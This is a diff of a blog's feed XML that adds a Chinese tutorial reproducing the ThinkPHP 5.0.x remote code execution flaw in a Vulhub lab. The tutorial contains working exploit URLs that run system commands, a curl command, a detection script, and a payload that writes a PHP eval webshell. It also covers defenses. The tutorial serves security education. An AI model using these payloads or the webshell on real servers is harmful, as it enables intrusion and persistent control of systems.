@@ -4,6 +4,39 @@
   
   
   <entry>
+    <title>ThinkPHP 5.x 远程代码执行漏洞（基于 Vulhub 环境）</title>
+    <link href="/2025/07/27/ThinkPHP-5-x-%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%EF%BC%88%E5%9F%BA%E4%BA%8E-Vulhub-%E7%8E%AF%E5%A2%83%EF%BC%89/"/>
+    <url>/2025/07/27/ThinkPHP-5-x-%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%EF%BC%88%E5%9F%BA%E4%BA%8E-Vulhub-%E7%8E%AF%E5%A2%83%EF%BC%89/</url>
+    
+    <content type="html"><![CDATA[<h1 id="深入剖析-ThinkPHP-5-x-远程代码执行漏洞（基于-Vulhub-环境）"><a href="#深入剖析-ThinkPHP-5-x-远程代码执行漏洞（基于-Vulhub-环境）" class="headerlink" title="深入剖析 ThinkPHP 5.x 远程代码执行漏洞（基于 Vulhub 环境）"></a>深入剖析 ThinkPHP 5.x 远程代码执行漏洞（基于 Vulhub 环境）</h1><h2 id="一、漏洞背景简介-🔍"><a href="#一、漏洞背景简介-🔍" class="headerlink" title="一、漏洞背景简介 🔍"></a>一、漏洞背景简介 🔍</h2><p>ThinkPHP 是一个轻量且易用的 PHP 开发框架，广泛应用于 Web 开发。然而，在 ThinkPHP 5.0.x 至 5.0.23 版本中，由于框架对动态函数调用（如 <code>invokeFunction</code>）的访问控制不严格，存在严重的 <strong>远程代码执行（RCE）漏洞</strong>。攻击者可通过精心构造的 URL 参数，调用任意 PHP 函数（如 <code>phpinfo</code> 或 <code>system</code>），实现远程执行任意代码或系统命令，危害极大。</p><p>本文基于 Vulhub 靶场环境，详细讲解该漏洞的原理、环境搭建、利用过程及防御措施，旨在帮助安全从业者和开发者深入理解并防范此类漏洞。</p><hr><h2 id="二、漏洞环境搭建"><a href="#二、漏洞环境搭建" class="headerlink" title="二、漏洞环境搭建"></a>二、漏洞环境搭建</h2><p>为了复现 ThinkPHP 5.x RCE 漏洞，我们使用 Vulhub 提供的靶场环境，结合 Docker 和 Kali Linux 进行搭建。以下是详细步骤：</p><h3 id="1-基础环境"><a href="#1-基础环境" class="headerlink" title="1. 基础环境"></a>1. 基础环境</h3><ul><li><strong>操作系统</strong>：Kali Linux（推荐使用虚拟机）  </li><li><strong>工具</strong>：已安装 Docker 和 Docker Compose  </li><li><strong>网络模式</strong>：<ul><li>NAT（用于访问外部网络）</li><li>仅主机模式（Host-Only，Kali IP：<code>192.168.56.102</code>）</li></ul></li><li><strong>硬件要求</strong>：建议 4GB 内存，2 核 CPU</li></ul><h3 id="2-获取-Vulhub-项目"><a href="#2-获取-Vulhub-项目" class="headerlink" title="2. 获取 Vulhub 项目"></a>2. 获取 Vulhub 项目</h3><p>Vulhub 是一个开源的漏洞靶场集合，包含 ThinkPHP 5.x RCE 环境。执行以下命令：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment"># 切换到工作目录</span><br><span class="hljs-built_in">cd</span> /root/vulhub/thinkphp/5-rce<br><br><span class="hljs-comment"># 如果未下载 Vulhub，克隆项目</span><br>git <span class="hljs-built_in">clone</span> https://github.com/vulhub/vulhub.git<br><span class="hljs-built_in">cd</span> vulhub/thinkphp/5-rce<br></code></pre></td></tr></table></figure><h3 id="3-启动漏洞环境"><a href="#3-启动漏洞环境" class="headerlink" title="3. 启动漏洞环境"></a>3. 启动漏洞环境</h3><p>在 vulhub&#x2F;thinkphp&#x2F;5-rce 目录下，运行以下命令启动 Docker 容器：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">docker-compose up -d<br></code></pre></td></tr></table></figure><p>启动后，访问以下地址：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs url">http://192.168.56.102:8080<br></code></pre></td></tr></table></figure><p>若看到 ThinkPHP V5 的欢迎页面，说明环境部署成功 </p><h3 id="4-容器管理操作"><a href="#4-容器管理操作" class="headerlink" title="4. 容器管理操作"></a>4. 容器管理操作</h3><p>查看运行中的容器：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">docker ps<br></code></pre></td></tr></table></figure><p>示例输出：</p><figure class="highlight zsh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs zsh">CONTAINER ID   IMAGE                       PORTS                    NAMES<br>e5117e659934   vulhub/thinkphp:5.0.23      0.0.0.0:8080-&gt;80/tcp     thinkphp_5-rce_1<br></code></pre></td></tr></table></figure><p>停止指定容器：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">docker stop e5117e659934<br></code></pre></td></tr></table></figure><p>一键停止并移除容器及网络：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">docker-compose down<br></code></pre></td></tr></table></figure><hr><h2 id="三、漏洞原理解析"><a href="#三、漏洞原理解析" class="headerlink" title="三、漏洞原理解析"></a>三、漏洞原理解析</h2><h3 id="漏洞成因"><a href="#漏洞成因" class="headerlink" title="漏洞成因"></a>漏洞成因</h3><p>ThinkPHP 5.x 的控制器路由机制允许通过 URL 参数动态调用框架内部函数（如 <code>\think\app::invokeFunction</code>）。在 5.0.23 及以下版本中，框架未对这些调用进行严格的权限校验，导致攻击者可以通过构造特定参数，调用任意 PHP 函数（如 <code>call_user_func_array</code>），并传递函数名和参数，从而触发远程代码执行。</p><h3 id="核心问题"><a href="#核心问题" class="headerlink" title="核心问题"></a>核心问题</h3><ul><li><strong>动态函数调用</strong>：<code>call_user_func_array</code> 允许动态调用任意 PHP 函数（如 <code>phpinfo</code>、<code>system</code> 等）。</li><li><strong>参数未过滤</strong>：用户输入的 <code>vars[0]</code>（函数名）和 <code>vars[1][]</code>（函数参数）直接传递到函数执行器，未经严格验证。</li><li><strong>路由暴露</strong>：通过 <code>s=/Index/\think\app/invokefunction</code>，攻击者可直接访问框架核心类。</li></ul><h3 id="漏洞危害"><a href="#漏洞危害" class="headerlink" title="漏洞危害"></a>漏洞危害</h3><ul><li>执行任意 PHP 代码</li><li>运行系统命令，获取权限</li><li>上传 WebShell，长期控制服务器</li><li>窃取配置文件、数据库信息</li><li>删除文件或修改系统配置</li></ul><hr><h2 id="四、漏洞利用演示"><a href="#四、漏洞利用演示" class="headerlink" title="四、漏洞利用演示"></a>四、漏洞利用演示</h2><p>以下展示如何利用 ThinkPHP 5.x RCE 漏洞，基于 Vulhub 靶场环境。</p><h3 id="1-测试-PHP-函数调用"><a href="#1-测试-PHP-函数调用" class="headerlink" title="1. 测试 PHP 函数调用"></a>1. 测试 PHP 函数调用</h3><p>访问以下 Payload：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs url">http://192.168.56.102:8080/index.php?s=/Index/\think\app/invokefunction&amp;function=call_user_func_array&amp;vars[0]=phpinfo&amp;vars[1][]=1<br></code></pre></td></tr></table></figure><p><strong>参数解析</strong>：</p><ul><li><code>s=/Index/\think\app/invokefunction</code>：指定路由</li><li><code>function=call_user_func_array</code>：调用函数</li><li><code>vars[0]=phpinfo</code>：目标函数</li><li><code>vars[1][]=1</code>：参数（执行 phpinfo(1)）</li></ul><p><strong>结果</strong>：</p><p>页面显示 phpinfo 配置信息，说明漏洞存在 </p><h3 id="2-执行系统命令"><a href="#2-执行系统命令" class="headerlink" title="2. 执行系统命令"></a>2. 执行系统命令</h3><p>执行 <code>whoami</code>：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs url">http://192.168.56.102:8080/index.php?s=/Index/\think\app/invokefunction&amp;function=call_user_func_array&amp;vars[0]=system&amp;vars[1][]=whoami<br></code></pre></td></tr></table></figure><p><strong>结果示例</strong>：</p><figure class="highlight haskell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs haskell"><span class="hljs-title">www</span>-<span class="hljs-class"><span class="hljs-keyword">data</span></span><br></code></pre></td></tr></table></figure><p>表示系统命令执行成功。</p><h3 id="其他命令测试："><a href="#其他命令测试：" class="headerlink" title="其他命令测试："></a>其他命令测试：</h3><ul><li><p>查看用户 ID：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs url">http://192.168.56.102:8080/index.php?s=/Index/\think\app/invokefunction&amp;function=call_user_func_array&amp;vars[0]=system&amp;vars[1][]=id<br></code></pre></td></tr></table></figure></li><li><p>列出目录：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs url">http://192.168.56.102:8080/index.php?s=/Index/\think\app/invokefunction&amp;function=call_user_func_array&amp;vars[0]=system&amp;vars[1][]=ls%20/<br></code></pre></td></tr></table></figure></li><li><p>查看网络配置：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs url">http://192.168.56.102:8080/index.php?s=/Index/\think\app/invokefunction&amp;function=call_user_func_array&amp;vars[0]=system&amp;vars[1][]=ifconfig<br></code></pre></td></tr></table></figure></li></ul><h3 id="3-使用-Curl-测试"><a href="#3-使用-Curl-测试" class="headerlink" title="3. 使用 Curl 测试"></a>3. 使用 Curl 测试</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">curl <span class="hljs-string">&quot;http://192.168.56.102:8080/index.php?s=/Index/\\think\\app/invokefunction&amp;function=call_user_func_array&amp;vars[0]=system&amp;vars[1][]=whoami&quot;</span><br></code></pre></td></tr></table></figure><blockquote><p>注意：URL 中的 <code>\</code> 要写成 <code>\\</code></p></blockquote><h3 id="4-使用-Burp-Suite-测试"><a href="#4-使用-Burp-Suite-测试" class="headerlink" title="4. 使用 Burp Suite 测试"></a>4. 使用 Burp Suite 测试</h3><ul><li>在浏览器中访问目标页面，拦截请求</li><li>将 Payload 粘贴进 Repeater 中测试</li><li>修改 <code>vars[1][]</code> 的值如 <code>id</code>、<code>ls</code> 等</li></ul><hr><h2 id="五、Payload-结构总结"><a href="#五、Payload-结构总结" class="headerlink" title="五、Payload 结构总结"></a>五、Payload 结构总结</h2><table><thead><tr><th>参数键</th><th>功能说明</th></tr></thead><tbody><tr><td><code>s</code></td><td>请求路由，指向 ThinkPHP 核心类</td></tr><tr><td><code>function</code></td><td>要调用的 PHP 函数（如 <code>call_user_func_array</code>）</td></tr><tr><td><code>vars[0]</code></td><td>执行的函数名称（如 <code>phpinfo</code>, <code>system</code>）</td></tr><tr><td><code>vars[1][]</code></td><td>函数的参数数组（如 <code>whoami</code>, <code>id</code>）</td></tr></tbody></table><hr><h2 id="六、防御措施"><a href="#六、防御措施" class="headerlink" title="六、防御措施"></a>六、防御措施</h2><ol><li><p><strong>升级 ThinkPHP 版本</strong></p><p>升级至 ThinkPHP 5.0.24 或更高版本。</p></li><li><p><strong>输入验证与过滤</strong></p><ul><li>白名单验证 <code>s</code> 参数</li><li>禁用危险函数如 <code>call_user_func_array</code></li><li>严格过滤所有用户输入参数</li></ul></li><li><p><strong>禁用危险函数</strong></p><p>在 <code>php.ini</code> 中：</p><figure class="highlight mel"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs mel">disable_functions = <span class="hljs-keyword">eval</span>,<span class="hljs-keyword">exec</span>,<span class="hljs-keyword">system</span>,passthru,shell_exec,proc_open,call_user_func_array<br></code></pre></td></tr></table></figure></li><li><p><strong>最小权限原则</strong></p><p>Web 服务运行用户不要使用 <code>root</code>，限制文件访问权限。</p></li><li><p><strong>部署 WAF</strong></p><p>拦截请求中包含敏感函数或路径的攻击尝试。</p></li><li><p><strong>安全审计与监控</strong></p><p>定期扫描、日志审计，发现异常行为。</p></li></ol><hr><h2 id="七、笔记总结"><a href="#七、笔记总结" class="headerlink" title="七、笔记总结"></a>七、笔记总结</h2><table><thead><tr><th>内容项</th><th>信息</th></tr></thead><tbody><tr><td>漏洞类型</td><td>RCE（远程代码执行）</td></tr><tr><td>影响版本</td><td>ThinkPHP 5.0.x 至 5.0.23</td></tr><tr><td>漏洞原因</td><td>动态函数调用缺乏授权校验</td></tr><tr><td>复现方式</td><td>URL GET 请求构造 Payload</td></tr><tr><td>环境工具</td><td>Vulhub、Docker、Kali Linux</td></tr></tbody></table><hr><h2 id="八、附加玩法"><a href="#八、附加玩法" class="headerlink" title="八、附加玩法"></a>八、附加玩法</h2><h3 id="自动化检测脚本"><a href="#自动化检测脚本" class="headerlink" title="自动化检测脚本"></a>自动化检测脚本</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> requests<br><br>url = <span class="hljs-string">&quot;http://192.168.56.102:8080/index.php?s=/Index/\\think\\app/invokefunction&amp;function=call_user_func_array&amp;vars[0]=system&amp;vars[1][]=whoami&quot;</span><br>response = requests.get(url)<br><span class="hljs-keyword">if</span> <span class="hljs-string">&quot;www-data&quot;</span> <span class="hljs-keyword">in</span> response.text:<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;Vulnerability found!&quot;</span>)<br><span class="hljs-keyword">else</span>:<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;No vulnerability detected.&quot;</span>)<br></code></pre></td></tr></table></figure><h3 id="上传-WebShell"><a href="#上传-WebShell" class="headerlink" title="上传 WebShell"></a>上传 WebShell</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs url">http://192.168.56.102:8080/index.php?s=/Index/\think\app/invokefunction&amp;function=call_user_func_array&amp;vars[0]=system&amp;vars[1][]=echo%20%27%3C%3Fphp%20%40eval%28%24_POST%5B%27pass%27%5D%29%3B%20%3F%3E%27%20%3E%20/var/www/html/shell.php<br></code></pre></td></tr></table></figure><p>使用蚁剑连接：</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs cpp">http:<span class="hljs-comment">//192.168.56.102:8080/shell.php</span><br></code></pre></td></tr></table></figure><h3 id="提权尝试"><a href="#提权尝试" class="headerlink" title="提权尝试"></a>提权尝试</h3><p>结合弱口令、提权漏洞等，可使用 Metasploit 等工具进一步入侵。</p><hr><h2 id="九、总结"><a href="#九、总结" class="headerlink" title="九、总结"></a>九、总结</h2><p>ThinkPHP 5.x RCE 漏洞是一个典型的动态函数调用漏洞，利用简单但危害极大。通过 Vulhub 靶场，我们可以快速复现漏洞，深入理解其原理和利用方式。</p><p>开发者应及时升级框架版本，实施严格的输入验证和权限控制，部署 WAF 和监控机制，以降低漏洞被利用的风险。</p><p>希望本文能帮助读者更好地理解和防范 ThinkPHP RCE 漏洞，同时提升 Web 应用安全开发的意识！</p><hr><h2 id="⚠️-免责声明"><a href="#⚠️-免责声明" class="headerlink" title="⚠️ 免责声明"></a>⚠️ 免责声明</h2><p>本文内容仅供网络安全学习和研究使用，请勿用于非法用途。任何个人或组织使用本文信息进行的违法活动，均与作者无关。读者应当遵守当地法律法规，在合法授权的环境下进行安全测试。</p>]]></content>
+    
+    
+    <categories>
+      
+      <category>Web安全</category>
+      
+      <category>漏洞分析</category>
+      
+    </categories>
+    
+    
+    <tags>
+      
+      <tag>Web安全</tag>
+      
+      <tag>RCE</tag>
+      
+      <tag>漏洞复现</tag>
+      
+      <tag>ThinkPHP</tag>
+      
+    </tags>
+    
+  </entry>
+  
+  
+  
+  <entry>
     <title>命令执行漏洞</title>
     <link href="/2025/07/26/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/"/>
     <url>/2025/07/26/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/</url>
@@ -22,9 +55,9 @@
     
     <tags>
       
-      <tag>渗透测试</tag>
-      
       <tag>Web安全</tag>
+      
+      <tag>渗透测试</tag>
       
       <tag>命令执行</tag>
       
@@ -90,11 +123,11 @@
     
     <tags>
       
-      <tag>渗透测试</tag>
-      
       <tag>Web安全</tag>
       
       <tag>SQL注入</tag>
+      
+      <tag>渗透测试</tag>
       
       <tag>网络安全</tag>
       
@@ -158,11 +191,11 @@
     
     <tags>
       
+      <tag>渗透测试</tag>
+      
       <tag>工具</tag>
       
       <tag>sqlmap</tag>
-      
-      <tag>渗透测试</tag>
       
     </tags>
     
